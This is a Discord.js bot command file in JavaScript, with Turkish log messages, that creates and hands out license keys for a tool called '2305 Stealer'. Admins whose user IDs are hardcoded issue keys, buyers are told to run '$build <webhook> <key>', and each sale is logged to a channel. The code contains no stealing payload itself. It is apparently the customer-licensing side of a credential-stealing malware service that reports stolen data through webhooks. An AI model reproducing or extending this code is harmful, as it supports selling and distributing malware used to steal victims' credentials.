const Discord = require("discord.js");
const moment = require("moment");
const profiles = require("../tables/profiles");
const os = require("os");
var randomstring = require("randomstring");
require("moment-duration-format");

exports.run = async (client, message, args) => {
  const user = message.guild.members.cache.get(args[0]);
  if (!args[0]) {
    message.channel.send("Invalid arguments! Use: $createkey <customerid>")
  } else {
  if (message.author.id == "975457597014564995" || message.author.id =="853269878593159227"  || message.author.id =="985251600144674897" ) { 
  
    let newData = new profiles({
    userid: user,
    key: "2305-"+randomstring.generate(10),
  });
  newData.save().then();
  const exampleEmbed = new Discord.MessageEmbed()
.setColor('#36393f')
.setAuthor('2305 Stealer', 'https://cdn.discordapp.com/attachments/897876884631744514/985985966143578212/f8d0562311308038aed4beac5e7620b9.jpg')
.setDescription(`${user}, Look DM!`)
.setTimestamp()
.setFooter('2305 Stealer');

 await user.send(`👌 Thanks for use 2305 Stealer! That's your key \`${newData.key}\` :eyes: \n👌 Use: $build <webhook> <key>`)
 await message.guild.channels.cache.get("986153544975523881").send(`${message.author} Adlı kullanıcı tarafından👌 ${user} \`${user.id}\` Adlı kulanıcının keyi  \`${newData.key}\` `)

 await message.channel.send(exampleEmbed)
  await user.roles.add("986153010507968512")
}
}
};

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ["s","key"],
  permLevel: 0
};

exports.help = {
  name: "createkey",
  description: "Botun istatistiklerini gösterir",
  usage: "istatistik"
};